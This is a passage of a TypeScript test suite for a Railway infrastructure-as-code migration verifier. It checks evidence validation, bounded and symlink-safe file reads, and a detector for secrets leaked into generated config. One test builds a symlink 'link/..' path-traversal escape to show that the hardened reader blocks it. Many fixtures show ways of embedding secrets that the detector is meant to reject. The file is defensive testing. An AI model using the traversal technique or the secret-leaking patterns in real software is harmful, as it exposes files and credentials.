import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  unlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import {
  generatedIacSourceIsSecretSafe,
  RAILWAY_IAC_MIGRATION_REASONS,
  RAILWAY_LEGACY_FIXTURE_PATH,
  RAILWAY_LEGACY_FIXTURE_SHA256,
  type RailwayIacFilesystemEvidence,
  validateRailwayIacMigrationEvidence,
} from "../../scripts/railway-iac-migration-contract";
import {
  isDirectEntrypoint,
  localFilesystemEvidence,
  MAX_GENERATED_IAC_BYTES,
  MAX_LEGACY_CONFIG_BYTES,
  readBoundedFile,
  readBoundedTextFile,
} from "../../scripts/verify-railway-iac-migration";

const NOW = Date.parse("2026-08-28T06:00:00.000Z");
const GENERATED_SOURCE = `
  import { defineRailway, preserve, project, service } from "railway/iac";
  const web = service("fixture", { env: { ONLINE_OPS_TOKEN: preserve() } });
  export default defineRailway(() => project("fixture", { resources: [web] }));
`;
const GENERATED_SHA = createHash("sha256")
  .update(GENERATED_SOURCE)
  .digest("hex");
const CURRENT_REPOSITORY_SOURCE = readFileSync(
  resolve(process.cwd(), "railway.json"),
  "utf8",
);
const CURRENT_REPOSITORY_SHA = createHash("sha256")
  .update(CURRENT_REPOSITORY_SOURCE, "utf8")
  .digest("hex");
const LEGACY_FIXTURE_SOURCE = readFileSync(
  resolve(process.cwd(), RAILWAY_LEGACY_FIXTURE_PATH),
  "utf8",
);
const FILESYSTEM: RailwayIacFilesystemEvidence = {
  generatedIacPath: ".railway/railway.ts",
  generatedIacSha256: GENERATED_SHA,
  generatedIacSecretSafe: true,
  currentRepositoryFilePresent: true,
  currentRepositoryFileSha256: CURRENT_REPOSITORY_SHA,
  currentRepositoryFileContent: CURRENT_REPOSITORY_SOURCE,
  legacyFixturePresent: true,
  legacyFixtureSha256: RAILWAY_LEGACY_FIXTURE_SHA256,
  legacyFixtureContent: LEGACY_FIXTURE_SOURCE,
};

function filesystemWithCurrentRepositorySource(
  source: string,
): RailwayIacFilesystemEvidence {
  return {
    ...FILESYSTEM,
    currentRepositoryFileSha256: createHash("sha256")
      .update(source, "utf8")
      .digest("hex"),
    currentRepositoryFileContent: source,
  };
}

function validEvidence(nowMs = NOW) {
  const capturedAt = new Date(nowMs).toISOString();
  const inventoryObservedAt = new Date(nowMs - 5_000).toISOString();
  const preObservedAt = new Date(nowMs - 4_000).toISOString();
  const cutoverObservedAt = new Date(nowMs - 3_000).toISOString();
  const effectiveObservedAt = new Date(nowMs - 2_000).toISOString();
  const planCapturedAt = new Date(nowMs - 1_000).toISOString();
  const target = {
    projectId: "project-fixture",
    projectName: "project fixture",
    environmentId: "environment-fixture",
    environmentName: "production",
    serviceId: "service-fixture",
    serviceName: "service fixture",
  };
  const targetFields = {
    projectId: target.projectId,
    environmentId: target.environmentId,
    serviceId: target.serviceId,
  };
  const source = {
    repository: "AutoDevJapan/FourBrosMahjong",
    branch: "main",
    rootDirectory: null,
    revision: "a".repeat(40),
  };
  const configSource = {
    repository: source.repository,
    branch: source.branch,
    rootDirectory: source.rootDirectory,
  };
  const config = {
    builder: "DOCKERFILE",
    dockerfilePath: "Dockerfile",
    startCommand: "node --import tsx server/start.ts",
    // #742 models the pre-cutover effective Railway baseline. #726's
    // repository target is /readyz, but no external deployment is assumed.
    healthcheckPath: "/healthz",
    healthcheckTimeoutSeconds: 60,
    replicaCount: 1,
    restartPolicyType: "ON_FAILURE",
    restartPolicyMaxRetries: 10,
    overlapSeconds: 0,
    drainingSeconds: 0,
    watchPatterns: [] as string[],
  };
  const resourceAddresses = [
    "project.fixture",
    "service.service-fixture",
    "service.service-fixture.variables",
    "service.service-fixture.domain.primary",
  ];
  return {
    schemaVersion: 1,
    capturedAt,
    cliEvidence: {
      capturedFromHelp: true,
      cliVersion: "5.42.1",
      pullSupported: true,
      planSupported: true,
      planJsonSupported: true,
      planOutSupported: true,
      detailedExitCodeSupported: true,
    },
    target,
    inventory: {
      observedAt: inventoryObservedAt,
      source: "authorized-railway-config-pull",
      ownershipMode: "full-project",
      targetServiceAddress: "service.service-fixture",
      resourceAddresses,
      ...targetFields,
      serviceName: target.serviceName,
      authorityEvidenceSha256: "d".repeat(64),
    },
    generatedIac: {
      path: ".railway/railway.ts",
      sha256: GENERATED_SHA,
      generatedBy: "authorized-railway-config-pull",
      resourceAddresses: [...resourceAddresses],
      ownershipMode: "full-project",
      cliVersion: "5.42.1",
      sdkPackageVersion: "3.11.0",
      sdkSchemaRevision: "c1b6ea8dd3e815e57257b1f17637e59d31db73b5",
      compatibilityReviewed: true,
      manualSecretReviewCompleted: true,
      decryptVariablesUsed: false,
      omitPreservedVariablesUsed: false,
      targetServiceConfig: structuredClone(config),
      targetServiceSource: structuredClone(configSource),
    },
    ownershipCutover: {
      observedAt: cutoverObservedAt,
      method: "authorized-manual-clear",
      ...targetFields,
      evidenceSha256: "e".repeat(64),
      legacyFileSha256: FILESYSTEM.legacyFixtureSha256,
      configFileSettingCleared: true,
      repositoryFileRetained: true,
      deleteFilesUsed: false,
      nonInteractiveFlagsUsed: false,
    },
    preCutoverReadback: {
      observedAt: preObservedAt,
      ...targetFields,
      source: structuredClone(source),
      config: structuredClone(config),
    },
    parityPlan: {
      capturedAt: planCapturedAt,
      sourceSha256: GENERATED_SHA,
      planOutputSha256: "c".repeat(64),
      pinnedPlanArtifactSha256: "f".repeat(64),
      pinnedPlanStoredOutsideRepository: true,
      cliVersion: "5.42.1",
      invocation:
        "railway config plan --json --detailed-exit-code --file .railway/railway.ts --out <outside-repository>/railway-plan.json",
      exitCode: 0,
      ...targetFields,
      additions: [] as string[],
      changes: [] as string[],
      destructions: [] as string[],
      unrelatedChanges: [] as string[],
      variableValuesRedacted: true,
      detailedExitCodeUsed: true,
      showValuesUsed: false,
      decryptVariablesUsed: false,
    },
    effectiveReadback: {
      observedAt: effectiveObservedAt,
      ...targetFields,
      source: structuredClone(source),
      config: structuredClone(config),
    },
  };
}

function reasonsFor(
  mutate: (evidence: ReturnType<typeof validEvidence>) => void,
  filesystem = FILESYSTEM,
  nowMs = NOW,
) {
  const evidence = validEvidence();
  mutate(evidence);
  return validateRailwayIacMigrationEvidence(evidence, filesystem, nowMs)
    .reasons;
}

function withTemporaryRepository<T>(callback: (rootDirectory: string) => T): T {
  const rootDirectory = mkdtempSync(join(tmpdir(), "railway-iac-read-"));
  try {
    mkdirSync(join(rootDirectory, ".railway"));
    writeFileSync(
      join(rootDirectory, "railway.json"),
      readFileSync(resolve(process.cwd(), "railway.json")),
    );
    const legacyFixturePath = join(rootDirectory, RAILWAY_LEGACY_FIXTURE_PATH);
    mkdirSync(dirname(legacyFixturePath), { recursive: true });
    writeFileSync(
      legacyFixturePath,
      readFileSync(resolve(process.cwd(), RAILWAY_LEGACY_FIXTURE_PATH)),
    );
    return callback(rootDirectory);
  } finally {
    rmSync(rootDirectory, { force: true, recursive: true });
  }
}

describe("Railway IaC parity snapshot contract (#742)", () => {
  it("passes only post-cutover parity evidence without authorizing an operation", () => {
    expect(
      validateRailwayIacMigrationEvidence(validEvidence(), FILESYSTEM, NOW),
    ).toEqual({
      schemaVersion: 1,
      migrationEvidence: "pass",
      authorizesMigration: false,
      authorizesApply: false,
      authorizesDeployment: false,
      externalMutationPerformed: false,
      reasons: [],
    });
  });

  it("holds the current repository until generated IaC exists", () => {
    const currentFilesystem = {
      generatedIacPath: null,
      generatedIacSha256: null,
      generatedIacSecretSafe: null,
      currentRepositoryFilePresent: FILESYSTEM.currentRepositoryFilePresent,
      currentRepositoryFileSha256: FILESYSTEM.currentRepositoryFileSha256,
      currentRepositoryFileContent: FILESYSTEM.currentRepositoryFileContent,
      legacyFixturePresent: FILESYSTEM.legacyFixturePresent,
      legacyFixtureSha256: FILESYSTEM.legacyFixtureSha256,
      legacyFixtureContent: FILESYSTEM.legacyFixtureContent,
    } satisfies RailwayIacFilesystemEvidence;
    expect(
      validateRailwayIacMigrationEvidence(
        validEvidence(),
        currentFilesystem,
        NOW,
      ).reasons,
    ).toEqual(["generated-iac-missing", "secret-safety-unverified"]);
  });

  it.each([
    ["missing", () => undefined],
    [
      "oversized",
      (generatedPath: string) => {
        writeFileSync(
          generatedPath,
          Buffer.alloc(MAX_GENERATED_IAC_BYTES + 1, "x"),
        );
      },
    ],
    [
      "read failure",
      (generatedPath: string) => {
        symlinkSync("missing-target", generatedPath);
      },
    ],
  ])("keeps %s generated IaC fail-closed", (_caseName, prepare) => {
    const filesystem = withTemporaryRepository((rootDirectory) => {
      prepare(join(rootDirectory, ".railway", "railway.ts"));
      return localFilesystemEvidence(rootDirectory);
    });

    const evidence = validEvidence();
    evidence.ownershipCutover.legacyFileSha256 = filesystem.legacyFixtureSha256;
    expect(filesystem).toMatchObject({
      generatedIacPath: null,
      generatedIacSha256: null,
      generatedIacSecretSafe: null,
      legacyFixturePresent: true,
    });
    expect(
      validateRailwayIacMigrationEvidence(evidence, filesystem, NOW).reasons,
    ).toEqual(["generated-iac-missing", "secret-safety-unverified"]);
  });

  it("rejects a generated IaC file beneath a symlinked parent directory", () => {
    const filesystem = withTemporaryRepository((rootDirectory) => {
      const realDirectory = join(rootDirectory, "real-railway");
      mkdirSync(realDirectory);
      writeFileSync(join(realDirectory, "railway.ts"), GENERATED_SOURCE);
      rmSync(join(rootDirectory, ".railway"), {
        force: true,
        recursive: true,
      });
      symlinkSync(realDirectory, join(rootDirectory, ".railway"));
      return localFilesystemEvidence(rootDirectory);
    });

    expect(filesystem).toMatchObject({
      generatedIacPath: null,
      generatedIacSha256: null,
      generatedIacSecretSafe: null,
    });
  });

  it("rejects link/.. traversal that escapes the normalized root", () => {
    const fixtureDirectory = mkdtempSync(
      join(tmpdir(), "railway-iac-traversal-"),
    );
    try {
      const rootDirectory = join(fixtureDirectory, "root");
      const outsideDirectory = join(fixtureDirectory, "outside");
      const insideSentinel = Buffer.from("inside sentinel\n");
      const outsideSentinel = Buffer.from("outside sentinel\n");
      mkdirSync(rootDirectory);
      mkdirSync(outsideDirectory);
      writeFileSync(join(rootDirectory, "target"), insideSentinel);
      writeFileSync(join(fixtureDirectory, "target"), outsideSentinel);
      symlinkSync(outsideDirectory, join(rootDirectory, "link"));

      // Keep `link/..` in the path passed to the filesystem. `join()` and
      // `resolve()` would normalize it to the inside sentinel instead.
      const traversalPath = `${rootDirectory}/link/../target`;
      expect(readFileSync(join(rootDirectory, "target"))).toEqual(
        insideSentinel,
      );
      // This is what the vulnerable raw read would observe.
      expect(readFileSync(traversalPath)).toEqual(outsideSentinel);
      // The hardened helper rejects the escape and reads only the normalized
      // path within the root.
      expect(readBoundedFile(traversalPath, 64, rootDirectory)).toEqual(
        insideSentinel,
      );
      expect(readBoundedTextFile(traversalPath, 64, rootDirectory)).toBe(
        insideSentinel.toString("utf8"),
      );
    } finally {
      rmSync(fixtureDirectory, { force: true, recursive: true });
    }
  });

  it.each([
    [
      "missing",
      (legacyPath: string) => {
        unlinkSync(legacyPath);
      },
    ],
    [
      "oversized",
      (legacyPath: string) => {
        writeFileSync(
          legacyPath,
          Buffer.alloc(MAX_LEGACY_CONFIG_BYTES + 1, "x"),
        );
      },
    ],
    [
      "directory",
      (legacyPath: string) => {
        rmSync(legacyPath, { force: true, recursive: true });
        mkdirSync(legacyPath);
      },
    ],
    [
      "symlink",
      (legacyPath: string, rootDirectory: string) => {
        const targetPath = join(rootDirectory, "legacy-target.json");
        writeFileSync(targetPath, "{}\n");
        rmSync(legacyPath, { force: true, recursive: true });
        symlinkSync(targetPath, legacyPath);
      },
    ],
    [
      "read failure",
      (legacyPath: string, rootDirectory: string) => {
        rmSync(legacyPath, { force: true, recursive: true });
        symlinkSync(join(rootDirectory, "missing-target.json"), legacyPath);
      },
    ],
  ])("keeps %s legacy config fail-closed", (_caseName, prepare) => {
    const filesystem = withTemporaryRepository((rootDirectory) => {
      const legacyPath = join(rootDirectory, "railway.json");
      prepare(legacyPath, rootDirectory);
      return localFilesystemEvidence(rootDirectory);
    });

    expect(filesystem).toMatchObject({
      currentRepositoryFilePresent: false,
      currentRepositoryFileSha256: null,
    });
  });

  it("reads a regular legacy config and records its bounded raw hash", () => {
    const expected = readFileSync(resolve(process.cwd(), "railway.json"));
    const filesystem = withTemporaryRepository((rootDirectory) =>
      localFilesystemEvidence(rootDirectory),
    );

    expect(filesystem).toMatchObject({
      currentRepositoryFilePresent: true,
      currentRepositoryFileSha256: createHash("sha256")
        .update(expected)
        .digest("hex"),
    });
  });

  it("reads an ordinary file consistently across the bounded read passes", () => {
    withTemporaryRepository((rootDirectory) => {
      const filePath = join(rootDirectory, "ordinary.txt");
      const expected = Buffer.from("ordinary content\n");
      writeFileSync(filePath, expected);

      expect(readBoundedFile(filePath, expected.length, rootDirectory)).toEqual(
        expected,
      );
      expect(
        readBoundedTextFile(filePath, expected.length, rootDirectory),
      ).toBe(expected.toString("utf8"));
    });
  });

  it("resolves a symlinked verifier entrypoint before invoking main", () => {
    const moduleUrl = new URL(
      "../../scripts/verify-railway-iac-migration.ts",
      import.meta.url,
    ).href;
    const symlinkPath = join(
      mkdtempSync(join(tmpdir(), "railway-entrypoint-")),
      "verify.ts",
    );
    try {
      symlinkSync(fileURLToPath(moduleUrl), symlinkPath);
      expect(isDirectEntrypoint(symlinkPath, moduleUrl)).toBe(true);
    } finally {
      rmSync(dirname(symlinkPath), { force: true, recursive: true });
    }
  });

  it("accepts a regular legacy config at the byte limit", () => {
    const filesystem = withTemporaryRepository((rootDirectory) => {
      writeFileSync(
        join(rootDirectory, "railway.json"),
        Buffer.alloc(MAX_LEGACY_CONFIG_BYTES, "x"),
      );
      return localFilesystemEvidence(rootDirectory);
    });

    expect(filesystem.currentRepositoryFilePresent).toBe(true);
    expect(filesystem.currentRepositoryFileSha256).toBe(
      createHash("sha256")
        .update(Buffer.alloc(MAX_LEGACY_CONFIG_BYTES, "x"))
        .digest("hex"),
    );
  });

  it.each([
    [
      "cli-capability-unverified",
      (e: ReturnType<typeof validEvidence>) => {
        e.cliEvidence.cliVersion = "5.42.0";
        e.cliEvidence.detailedExitCodeSupported = false;
      },
    ],
    [
      "evidence-stale",
      (e: ReturnType<typeof validEvidence>) => {
        e.capturedAt = new Date(NOW - 300_001).toISOString();
      },
    ],
    [
      "target-identity-invalid",
      (e: ReturnType<typeof validEvidence>) => {
        e.target.environmentName = "staging";
      },
    ],
    [
      "resource-inventory-mismatch",
      (e: ReturnType<typeof validEvidence>) => {
        e.inventory.resourceAddresses = ["service.another"];
      },
    ],
    [
      "generated-iac-invalid",
      (e: ReturnType<typeof validEvidence>) => {
        e.generatedIac.sdkSchemaRevision = "b".repeat(40);
      },
    ],
    [
      "generated-service-parity-mismatch",
      (e: ReturnType<typeof validEvidence>) => {
        e.generatedIac.targetServiceConfig.startCommand = "pnpm server:start";
      },
    ],
    [
      "ownership-cutover-unverified",
      (e: ReturnType<typeof validEvidence>) => {
        e.ownershipCutover.configFileSettingCleared = false;
      },
    ],
    [
      "evidence-order-invalid",
      (e: ReturnType<typeof validEvidence>) => {
        e.ownershipCutover.observedAt = e.preCutoverReadback.observedAt;
      },
    ],
    [
      "effective-readback-invalid",
      (e: ReturnType<typeof validEvidence>) => {
        e.effectiveReadback.config.healthcheckTimeoutSeconds = 0;
      },
    ],
    [
      "parity-readback-mismatch",
      (e: ReturnType<typeof validEvidence>) => {
        e.effectiveReadback.config.startCommand = "pnpm server:start";
      },
    ],
    [
      "parity-plan-target-mismatch",
      (e: ReturnType<typeof validEvidence>) => {
        e.parityPlan.serviceId = "service-other";
      },
    ],
    [
      "parity-plan-not-clean",
      (e: ReturnType<typeof validEvidence>) => {
        e.parityPlan.exitCode = 2;
        e.parityPlan.changes.push("service.deploy.startCommand");
      },
    ],
    [
      "pinned-plan-unverified",
      (e: ReturnType<typeof validEvidence>) => {
        e.parityPlan.pinnedPlanArtifactSha256 = "not-a-sha256";
        e.parityPlan.pinnedPlanStoredOutsideRepository = false;
      },
    ],
    [
      "secret-safety-unverified",
      (e: ReturnType<typeof validEvidence>) => {
        e.parityPlan.detailedExitCodeUsed = false;
        e.parityPlan.showValuesUsed = true;
      },
    ],
  ])("reports %s for its deterministic mutation", (reason, mutate) => {
    expect(reasonsFor(mutate)).toContain(reason);
  });

  it("does not treat a prerelease as the stable CLI minimum", () => {
    const prerelease = "5.42.1-rc.1";
    expect(
      reasonsFor((e) => {
        e.cliEvidence.cliVersion = prerelease;
        e.generatedIac.cliVersion = prerelease;
        e.parityPlan.cliVersion = prerelease;
      }),
    ).toContain("cli-capability-unverified");
  });

  it("requires the immutable pre-cutover legacy fixture", () => {
    expect(
      validateRailwayIacMigrationEvidence(
        validEvidence(),
        {
          ...FILESYSTEM,
          legacyFixturePresent: false,
          legacyFixtureSha256: null,
          legacyFixtureContent: null,
        },
        NOW,
      ).reasons,
    ).toContain("legacy-config-missing");
  });

  it("rejects invalid clocks and malformed schemas without reflection", () => {
    expect(
      validateRailwayIacMigrationEvidence(validEvidence(), FILESYSTEM, -1)
        .reasons,
    ).toContain("clock-invalid");
    expect(
      validateRailwayIacMigrationEvidence(
        { secret: "SECRET_SENTINEL" },
        FILESYSTEM,
        NOW,
      ).reasons,
    ).toEqual(["invalid-schema"]);
  });

  it("requires static and manual secret review without treating either as proof", () => {
    expect(generatedIacSourceIsSecretSafe(GENERATED_SOURCE)).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `const env = { ONLINE_OPS_TOKEN: "SECRET_SENTINEL" }; preserve();`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `${GENERATED_SOURCE}\n// Bearer abcdefghijklmnopqrstuvwxyz`,
      ),
    ).toBe(false);
    expect(generatedIacSourceIsSecretSafe("const config = {}")).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import type { service } from "railway/iac"; service("fixture", {});`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { type service } from "railway/iac"; service("fixture", {});`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const token = "SECRET_SENTINEL"; service("fixture", { env: { ONLINE_OPS_TOKEN: token } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const token = "SECRET_SENTINEL"; service("fixture", { options: { ONLINE_OPS_TOKEN: token } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const token = "SECRET_SENTINEL"; service("fixture", { options: { ONLINE_OPS_TOKEN: { value: token } } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const token = "SECRET_SENTINEL"; service("fixture", { options: { ONLINE_OPS_TOKEN: \`${"${token}"}\` } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const ONLINE_OPS_TOKEN = "SECRET_SENTINEL"; service("fixture", { options: { ONLINE_OPS_TOKEN } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { TOKEN: -1 } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { env: { PUBLIC_VALUE: "not-secret-but-not-preserved" } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { env: { VALUE: preserve("RAW") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { env: { VALUE: ref("RAW") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { env: { VALUE: ref(resource) } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { ref, service } from "railway/iac"; const resource = service("other", {}); service("fixture", { env: { VALUE: ref(resource, "output") } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { ref, service } from "railway/iac"; service("fixture", { env: { VALUE: ref("resource", "output") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; const db = postgres("db"); service("fixture", { env: { DATABASE_URL: db.env.DATABASE_URL } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, service } from "railway/iac"; export default defineRailway((ctx) => service("fixture", { env: { VALUE: ctx.shared.SECRET } }));`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const ctx = { shared: { VALUE: "SECRET_SENTINEL" } }; service("fixture", { env: { VALUE: ctx.shared.VALUE } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const read = (ctx) => service("fixture", { env: { VALUE: ctx.shared.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, preserve, project, service } from "railway/iac"; export default defineRailway(() => { const preserve = () => "SECRET_SENTINEL"; const web = service("fixture", { env: { TOKEN: preserve() } }); return project("fixture", { resources: [web] }); });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, project, ref, service } from "railway/iac"; export default defineRailway(() => { const resource = service("other", {}); const ref = () => "SECRET_SENTINEL"; const web = service("fixture", { env: { TOKEN: ref(resource, "output") } }); return project("fixture", { resources: [resource, web] }); });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { ref, service } from "railway/iac"; const resource = service("other", {}); const build = (ref) => service("fixture", { env: { TOKEN: ref(resource, "output") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { preserve, service } from "railway/iac"; const build = (preserve) => service("fixture", { env: { TOKEN: preserve() } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { preserve, service } from "railway/iac"; const build = function preserve() { return service("fixture", { env: { TOKEN: preserve() } }); };`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const host = { runtime: Bun }; service("fixture", { source: host.runtime.env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const host = { runtime: Bun }; service("fixture", { source: host.runtime["env"].SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { source: import.meta.env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { source: ctx.shared.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { source: this.shared.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { source: super.shared.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; const db = postgres("db"); service("fixture", { source: db.env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const resource = service("other", {}); const { env } = resource; service("fixture", { source: env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const make = ({ env }) => service("fixture", { source: env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { ref, service } from "railway/iac"; const untrusted = ctx; service("fixture", { source: ref(untrusted, "output") });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { ["TOKEN"]: "SECRET_SENTINEL" } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { "TOKEN": "SECRET_SENTINEL" } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { TOKEN: ("SECRET_SENTINEL") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { TOKEN: { value: "SECRET_SENTINEL" } } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { ["TOKEN"]: ("SECRET_SENTINEL") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { ...externalOptions } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const options = externalOptions; service("fixture", options);`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { preserve, service } from "railway/iac"; const options = { env: { TOKEN: preserve() } }; service("fixture", options);`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { preserve, service } from "railway/iac"; const safeValue = preserve(); service("fixture", { env: { TOKEN: safeValue } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const key = "TOKEN"; service("fixture", { options: { [key]: "SECRET_SENTINEL" } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { ["TOKEN"]() { return "SECRET_SENTINEL"; } } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { get ["TOKEN"]() { return "SECRET_SENTINEL"; } } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { set ["TOKEN"](value) {} } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { preserve, service } from "railway/iac"; service("fixture", { ["env"]: { ["ONLINE_OPS_TOKEN"]: preserve() } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; const db = postgres("db"); service("fixture", { env: { DATABASE_URL: db["env"]["DATABASE_URL"] } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, service } from "railway/iac"; export default defineRailway((ctx) => service("fixture", { env: { VALUE: ctx["shared"]["SECRET"] } }));`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { ref, service } from "railway/iac"; const resource = service("other", {}); service("fixture", { options: { TOKEN: (ref(resource, "output")) } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const options = externalOptions; service("fixture", options);`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: externalOptions });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { preserve, service } from "railway/iac"; service("fixture", { env: { TOKEN: preserve() } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; const db = postgres("db"); service("fixture", { env: { DATABASE_URL: db["env"]["DATABASE_URL"] } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, service } from "railway/iac"; export default defineRailway((ctx) => service("fixture", { env: { VALUE: ctx["shared"]["SECRET"] } }));`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; const db = postgres("db"); { const db = Bun; service("fixture", { env: { VALUE: db.env.SECRET } }); }`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; const db = postgres("db"); const make = (db) => service("fixture", { env: { VALUE: db.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { env: { VALUE: Bun.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { env: { VALUE: Deno.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const foo = Bun; service("fixture", { env: { VALUE: foo.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { source: Bun.env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { env: { VALUE: ctx.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { source: Bun["env"].SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { env: { VALUE: process.env.RAW } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `const raw = process.env.RAW; service("fixture", {});`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `const env = {}; service("fixture", { env });`,
      ),
